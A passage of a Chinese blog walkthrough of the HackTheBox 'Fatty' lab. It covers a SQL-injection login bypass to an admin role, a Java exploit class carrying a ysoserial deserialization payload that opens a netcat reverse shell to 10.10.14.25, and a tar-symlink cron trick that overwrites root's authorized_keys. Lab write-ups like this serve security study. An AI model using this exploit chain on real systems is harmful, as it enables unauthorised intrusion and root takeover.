String <span class="title">open</span><span class="params">(String foldername, String filename)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line">    String methodName = (<span class="keyword">new</span> Object() &#123;</span><br><span class="line">    &#125;).getClass().getEnclosingMethod().getName();</span><br><span class="line">    logger.logInfo(<span class="string">"[+] Method '"</span> + methodName + <span class="string">"' was called by user '"</span> + <span class="keyword">this</span>.user.getUsername() + <span class="string">"'."</span>);</span><br><span class="line">    <span class="keyword">if</span> (AccessCheck.checkAccess(methodName, <span class="keyword">this</span>.user)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error: Method '"</span> + methodName + <span class="string">"' is not allowed for this user account"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.action = <span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID, <span class="string">"open"</span>);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(foldername);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(filename);</span><br><span class="line">        <span class="keyword">this</span>.sendAndRecv();</span><br><span class="line">        FileOutputStream  fos;</span><br><span class="line">        fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/fatty-server.jar"</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.response.hasError()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Error: Your action caused an error on the application server!"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String response = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response = <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                response = <span class="string">"Unable to convert byte[] to String. Did you read in a binary file?"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fos.write(<span class="keyword">this</span>.response.getContent());    </span><br><span class="line">            fos.close(); </span><br><span class="line">            <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>然后就是<code>javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java</code>.我们会发现<code>htb/fatty/client/methods/</code>下编译好了十几个class。接下来就是解包jar包。转移class文件并重新打包jar的事情了。</p>
<p>idea中导入我们重新改好的jar包。再次执行即可发现能够正常下载了。</p>
<p>下载好30分钟后我们得到了fatty-server.jar。再次审计server源码<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/5.PNG" alt></p>
<p>这一次很快就能在之前不确定的changePW处看到<code>readObject()</code>方法调用了。也就是说肯定存在反序列化漏洞。<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/6.PNG" alt><br>但是注意。把整个源码过一遍后会发现changePW方法对应的methodID 7需要adminrole才能执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getAdminRole</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"admin"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getUserRole</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"user"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getAnonymous</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"anonymous"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以我们必须找到一个能成为admin role的方法。回到登录那里的方法去审计</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">checkLogin</span><span class="params">(User user)</span> <span class="keyword">throws</span> FattyDbSession.LoginException </span>&#123;</span><br><span class="line">    Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line">    User newUser = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stmt = <span class="keyword">this</span>.conn.createStatement();</span><br><span class="line">        rs = stmt.executeQuery(<span class="string">"SELECT id,username,email,password,role FROM users WHERE username='"</span> + user.getUsername() + <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000L</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException var10) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">            <span class="keyword">int</span> id = rs.getInt(<span class="string">"id"</span>);</span><br><span class="line">            String username = rs.getString(<span class="string">"username"</span>);</span><br><span class="line">            String email = rs.getString(<span class="string">"email"</span>);</span><br><span class="line">            String password = rs.getString(<span class="string">"password"</span>);</span><br><span class="line">            String role = rs.getString(<span class="string">"role"</span>);</span><br><span class="line">            newUser = <span class="keyword">new</span> User(id, username, password, email, Role.getRoleByName(role), <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (newUser.getPassword().equalsIgnoreCase(user.getPassword())) &#123;</span><br><span class="line">                <span class="keyword">return</span> newUser;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FattyDbSession.LoginException(<span class="string">"Wrong Password!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FattyDbSession.LoginException(<span class="string">"Wrong Username!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var11) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.logError(<span class="string">"[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='"</span> + user.getUsername() + <span class="string">"' &lt;=="</span>);</span><br><span class="line">        <span class="keyword">this</span>.logger.logError(<span class="string">"[-] Exception was: '"</span> + var11.getMessage() + <span class="string">"'"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显。登录的位置存在sql注入。具体流程是：执行sql查询,用查询结果来实例化User类。并且调用了一个针对password的检查<code>newUser.getPassword().equalsIgnoreCase(user.getPassword()</code></p>
<p>这也就代表简单的万能密码不起作用了。为什么呢？我们来看看User类如何实例化的。直接找构造方法<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/7.PNG" alt><br>如果是我们之前那样。直接实例化一个含username,password的User对象。它会检查一个初始化中hash的值是否为false.如果不为false。那么会像上面的构造方法一样将<code>sha256(username+password+&#39;clarabibimakeseverythingsecure&#39;)</code>进行比对。<br>所以如果我们使用<code>&#39; or &#39;1&#39;=&#39;1</code>.那么sql语句返回结果自然是qtc的数据。但是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256(&quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;clarabibimakeseverythingsecure&quot;) &#x3D; sha256(&quot;qtc&quot;+&quot;clarabibi&quot;+&quot;clarabibimakeseverythingsecure&quot;)</span><br></pre></td></tr></table></figure>
<p>是不成立的。所以我们无法登陆。</p>
<p>但是不要紧。我们可以在这个sql语句里使用union查询返回一个admin用户。因为它是根据查询结果返回数据来实例化User类进而判断role是否为admin的。我们只需要</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User user=<span class="keyword">new</span> User(<span class="string">" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin"</span>,<span class="string">"byc_404"</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
<p>首先保证User类hash值为false。这样password不会进行sha256赋值。然后由于abc用户不存在。我们union查询返回的值即</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,'byc_404','a@b.com','byc_404','admin'</span><br></pre></td></tr></table></figure>
<p>用户role已经被设为admin了.<br>此时password与password相同。校验通过</p>
<p>我们更改下exp中user实例化的方法。并且尝试调用admin权限的ipconfig<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/8.PNG" alt></p>
<p>成功执行。此处还可以从ipconfig中172.28看出来java运行的靶机似乎是docker。</p>
<p>现在我们就可以尝试changePW进行反序列化了。不过同样由于原始changePW方法只传递一个双参数User对象。那么我们还得重写changePW方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">changePW</span><span class="params">(String payload)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.action=<span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID,<span class="string">"changePW"</span>);</span><br><span class="line">	<span class="keyword">this</span>.action.addArgument(payload);</span><br><span class="line">	<span class="keyword">this</span>.sendAndRecv();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更改Invoker源码后,然后就是按照上面的流程重新build jar包了。</p>
<p>重新导入后使用ysoserial生成payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="string">'nc 10.10.14.25 9001 -e /bin/sh'</span> |base64 -w 0</span><br></pre></td></tr></table></figure>
<p>(docker靶机没有bash…alpine靶机通病。所幸有老版本nc)</p>
<p>最终的exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> htb.fatty.client.connection.Connection;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.client.methods.Invoker;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageBuildException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageParseException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.resources.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = Connection.getConnection();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] connection failed: "</span>+ e.getMessage());</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[+] Successfully connected"</span>);</span><br><span class="line"></span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="string">" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin"</span>,<span class="string">"byc_404"</span>,<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn.login(user))&#123;</span><br><span class="line">            System.out.println(<span class="string">"[+] Successfully logged in"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] Login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String rolename=conn.getRoleName();</span><br><span class="line">        user.setRoleByName(rolename);</span><br><span class="line">        System.out.println(<span class="string">"[+] rolename is: "</span>+rolename);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Invoker invoker =<span class="keyword">new</span> Invoker(conn,user);</span><br><span class="line">        String response=<span class="string">""</span>;</span><br><span class="line">        String payload=<span class="string">"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHm5jIDEwLjEwLjE0LjI1IDkwMDEgLWUgL2Jpbi9zaHQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg="</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response=invoker.changePW(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MessageParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MessageBuildException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Server response:\n"</span>+ response);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接到回显后使用<code>ash -i 2&gt;&amp;1</code>升级tty.(没有python,socat。但是可以用ash)<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/9.PNG" alt></p>
<p>user qtc done.</p>
<p>小结下,这个部分真心困难。假如我没有看wp的话估计早就在中间某个环节放弃了。但是整体流程下来关于java的一些操作让我受益匪浅。尤其是jar包的部分。当然我也希望能找到重写jar包代码的最佳方案。</p>
<h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>接下来的部分就比较简单了。刚刚我们在start.sh中看到执行的命令除了jar以外还有cron的定时任务。查看下文件发现存在/etc/crontabs.back。其中存在备份的cronjob文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/</span><br></pre></td></tr></table></figure>
<p>它在定时地将<code>/opt/fatty/logs/</code> 下的内容打包到<code>/opt/fatty/tar/logs.tar</code><br>既然如此我们看看靶机到底对tar文件做了什么</p>
<p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/10.PNG" alt></p>
<p>可以看到。fatty本机在每隔一分钟使用scp同步文件。那么假如它是root用户在本机调用scp并且执行解包操作。我们就有办法进行提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /root/.ssh/authorized_keys out/logs.tar</span><br><span class="line">tar -cf logs.tar -C out/ logs.tar </span><br><span class="line">tar -tvf logs.tar</span><br></pre></td></tr></table></figure>
<p>首先我们创建一个指向root公钥的软链接。并且打包它自己。<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/11.PNG" alt><br>可看到此时logs.tar里的内容是一个指向root ssh公钥的软链接。假如我们解压它的话,将得到它本身。<br>接下来我们把它移动到<code>/opt/fatty/tar/logs.tar</code>.那么此时定时任务指执行的话,将把它转移到本机。并且解包，从而得到一个logs.tar文件,并且它是一个指向公钥的软链接。</p>
<p>接下来。假如我们把docker上的logs.tar换成一个包含我们ssh公钥的文件。那么当cronjob再次执行时,scp会把新的logs.tar 覆盖旧的。而旧的logs.tar是一个指向ssh公钥的软链接</p>
<p>这样的话思路就非常清楚了。在上面执行完logs.tar后执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp logs.tar &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar </span><br><span class="line"></span><br><span class="line">sleep 60</span><br><span class="line"></span><br><span class="line">echo -n &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaTnVHUaEL07CrQQoNh1zhTfnl5m6OGd4HPwmutz2ZkEf5fWSXrtMyrlxvNP5mtinS8vlRgEtF4KAsXkFceq4Ga&#x2F;ahgcYTdcKNFJQiBDz3cC1gu4az4mfdSYGIYav0UAiUel5lWN8SJ8FLUEd1hK85dIMOFLZoKNCO1gm1zOMQFB6A+WVUbchPhLm718YMkAawCHXzxhBEwJuQ1Il7wGWyZaPzuCTR+Dgci4xZDVr7459hfQJpGz7ZmTb9msnlk3Vnd156WnbR95qMkHPlaA0DMKPvs&#x2F;GjBf2dCREGdfZloTDo6yf&#x2F;b3Ev9d4n4EiF53nc38jlxLARckbAZwA15DwS15WbOS31ZV&#x2F;ZOi3YtKSkmA7nMRYoE0QZ5uhRMZySB1FfxtHOkZV+EnXD4WPeZwG23sIpQ3AYjlbuOiybnrK5iuKcf8uclLsvf7ToahPDhZSot2bH8gnS20mcC&#x2F;sb+uLrkdI85Qn8oCe7OoLeF&#x2F;QxESa&#x2F;lIMalSvml6dSvR8ORNk&#x3D; root@byc404&#39; &gt; &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/12.PNG" alt></p>
<p>rooted.</p>
<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  fatty 作为insane难度的靶机确实”实至名归”。java相关的知识恐怕能在一开始就劝退很多人了。不过幸好自己之前学习了java web的一些基础知识,在这里的实际场景才能发挥作用。一次渗透能学到很多知识，确实值得点赞。</p>

          
            <div class='article_footer'>
              
                
  
    
    



  

  
    
    



  

  
    
    

<section class="widget copyright  desktop mobile">
  <div class='content'>
    
      <blockquote>
        
          
            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>

          
        
          
            <p>本文永久链接是：<a href=https://www.bycsec.top/2020/08/10/hackthebox-Fatty-JavaExploits/>https://www.bycsec.top/2020/08/10/hackthebox-Fatty-JavaExploits/</a></p>
          
        
      </blockquote>
    
  </div>
</section>

  


              
            </div>
          
        </div>
        
          


  <section class='meta' id="footer-meta">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-08-10T13:29:40+08:00">
  <a class='notlink'>
    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
    <p>更新于：Aug 10, 2020</p>
  </a>
</div>

        
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/hackthebox/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>hackthebox</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/pentest/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>pentest</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Java/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Java</p></a></div>


        
      
        
          

        
      
        
          

        
      
    </div>
  </section>


        
        
          <div class="prev-next">
            
              <a class='prev' href='/2020/08/15/hackthebox-Unbalanced/'>
                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>hackthebox-Unbalanced</p>
                <p class='content'>
  
  
    请输入root hash 6H***Yw1，查看文章
    
  
  6e3bf2013272ad657b50a2f87081881f9bbeb984a37cfdded...</p>
              </a>
            
            
              <a class='next' href='/2020/08/05/Thinkphp-vuln/'>
                <p class='title'>Thinkphp-vuln<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
                <p class='content'>  这段时间因为一些原因老是有点自我纠结,很大程度上是因为对所计划学习的内容无法定夺的原因。上周因为hw所以错过了wmctf,赛后去看题发现基本都是php之类的,都不是很想看。相对感兴趣的框架的...</p>
              </a>
            
          </div>
        
      </section>
    </article>
  

  
    <!-- 显示推荐文章和评论 -->



  <article class="post white-box reveal comments shadow">
    <section class="article typo">
      <p ct><i class='fas fa-comments'></i> 评论</p>
      
      
      
      
      
      
        <section id="comments">
          <div id="valine_container" class="valine_thread">
            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
          </div>
        </section>
      
      
    </section>
  </article>


  




<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->



  <script>
    window.subData = {
      title: 'hackthebox-Fatty-JavaExploits',
      tools: true
    }
  </script>


</div>
<aside class='l_side'>
  
  

  
    
    


  <section class="widget toc-wrapper shadow desktop mobile">
    
  <header>
    
      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
    
  </header>


    <div class='content'>
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#initial-foothold-to-user"><span class="toc-text">initial-foothold to user</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#privesc-to-root"><span class="toc-text">privesc to root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li></ol>
    </div>
  </section>


  


</aside>


  
  <footer class="clearfix">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
